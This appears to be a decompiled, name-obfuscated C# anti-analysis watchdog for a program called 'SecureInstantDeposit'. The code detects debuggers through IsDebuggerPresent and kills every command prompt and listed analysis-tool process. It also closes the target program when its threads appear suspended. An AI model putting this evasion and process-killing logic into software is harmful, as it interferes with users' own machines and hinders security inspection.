using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;

namespace ns2;

internal static class Class8
{
	private delegate int Delegate0();

	private static int int_0 = 0;

	private static readonly string string_0 = "SecureInstantDeposit.vshost";

	private static DateTime dateTime_0;

	[DllImport("kernel32.dll")]
	public static extern IntPtr LoadLibrary(string dllToLoad);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

	[DllImport("kernel32.dll")]
	public static extern bool FreeLibrary(IntPtr hModule);

	private static void Main()
	{
		dateTime_0 = DateTime.Now;
		while (true)
		{
			smethod_2();
			smethod_0();
			smethod_3();
			if (!smethod_4())
			{
				continue;
			}
			Thread.Sleep(2000);
			try
			{
				if ((DateTime.Now - dateTime_0).Minutes < 30)
				{
					continue;
				}
				break;
			}
			catch
			{
			}
		}
	}

	private static bool smethod_0()
	{
		bool result = true;
		if (!Debugger.IsAttached)
		{
			result = false;
		}
		if (!SecurityManager.get_SecurityEnabled())
		{
			result = false;
		}
		if (!smethod_1())
		{
			result = false;
		}
		return result;
	}

	private static bool smethod_1()
	{
		IntPtr hModule = LoadLibrary("kernel32");
		IntPtr procAddress = GetProcAddress(hModule, "IsDebuggerPresent");
		Delegate0 @delegate = (Delegate0)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate0));
		int num = @delegate();
		FreeLibrary(hModule);
		if (num != 1)
		{
			return false;
		}
		return true;
	}

	private static void smethod_2()
	{
		Process[] processesByName = Process.GetProcessesByName("cmd");
		if (processesByName.Length > 0)
		{
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
		}
	}

	private static bool smethod_3()
	{
		List<string> list = Class9.smethod_0();
		Process[] processesByName = Process.GetProcessesByName(string_0);
		bool flag = true;
		if (processesByName.Length > 0)
		{
			foreach (string item in list)
			{
				Process[] processesByName2 = Process.GetProcessesByName(item);
				if (processesByName2.Length > 0)
				{
					Process[] array = processesByName2;
					int num = 0;
					if (0 < array.Length)
					{
						Process process = array[num];
						process.Kill();
						flag = false;
					}
				}
			}
		}
		if (!flag)
		{
			processesByName[0].PriorityClass = ProcessPriorityClass.BelowNormal;
			processesByName[0].CloseMainWindow();
		}
		return true;
	}

	private static bool smethod_4()
	{
		Process[] processesByName = Process.GetProcessesByName(string_0);
		if (processesByName.Length > 0)
		{
			ProcessThreadCollection threads = processesByName[0].Threads;
			long num = threads.Count;
			long num2 = 0L;
			foreach (ProcessThread item in threads)
			{
				if (item.ThreadState == System.Diagnostics.ThreadState.Wait && item.WaitReason == ThreadWaitReason.Suspended)
				{
					num2++;
				}
			}
			if (num - num2 < num / 2L)
			{
				processesByName[0].CloseMainWindow();
			}
		}
		else
		{
			int_0++;
			if (int_0 == 5)
			{
				return false;
			}
			Thread.Sleep(5000);
		}
		return true;
	}
}
